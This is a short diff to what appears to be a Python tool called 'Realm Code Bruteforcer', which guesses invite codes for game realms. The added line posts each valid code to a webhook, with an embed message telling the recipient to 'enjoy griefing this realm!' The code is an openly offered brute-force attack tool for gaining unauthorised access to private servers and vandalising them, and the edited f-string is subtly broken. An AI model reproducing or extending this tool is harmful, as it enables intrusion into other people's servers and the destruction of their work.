@@ -9,7 +9,7 @@ data = {
   "embeds": [
     {
       "title": "Realm Code Bruteforcer",
-      "description": "It has found a code (), enjoy \ngriefing this realm!",
+      "description": "fIt has found a code ({link}), enjoy griefing this realm!",
       "color": 2112716,
       "author": {
         "name": "Developed by yeeterlol",
@@ -33,7 +33,7 @@ def SendRequest():
             print(f"Invalid | {link}")
         elif r.status_code == 200:
             print(f"Valid | {link}")
-
+            requests.post(webhook, json = data)
         else:
             print(f"Error | {link}")
 
